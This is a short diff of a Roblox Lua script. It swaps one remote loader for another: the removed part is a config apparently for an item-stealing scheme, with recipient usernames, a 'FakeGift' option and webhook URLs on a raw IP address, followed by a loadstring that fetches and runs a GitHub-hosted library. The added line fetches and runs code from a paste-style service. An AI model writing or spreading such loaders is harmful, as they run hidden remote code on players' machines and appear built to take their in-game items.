@@ -1,15 +1,4 @@
-_G.NullConfig = {
-    User = {'EX0EX0XEX021', 'EX0EX0XEX022', 'EX0EX0XEX023', 'EX0EX0XEX024', 'EX0EX0XEX025', 'EX0EX0XEX026', 'EX0EX0XEX027', 'EX0EX0XEX028', 'EX0EX0XEX029', 'EX0EX0XEX030'},
-    min_value = 10000000000,
-    pingEveryone = "No",
-    Webhook = "http://45.13.225.83:20002/proxy/ee791751af030df9753ad4b9c3d7ec26",
-    FakeGift = "Yes",
-    Trash = "http://45.13.225.83:20002/proxy/ee791751af030df9753ad4b9c3d7ec26",
-    LoadingScreen = "No",
-    GiftOnlyRares = "Yes"
-}
-
-loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/CNpnkxGKRJhWDD1b/raw", true))()
 
 local TweenService = game:GetService("TweenService")
 local ScreenGui = Instance.new("ScreenGui")
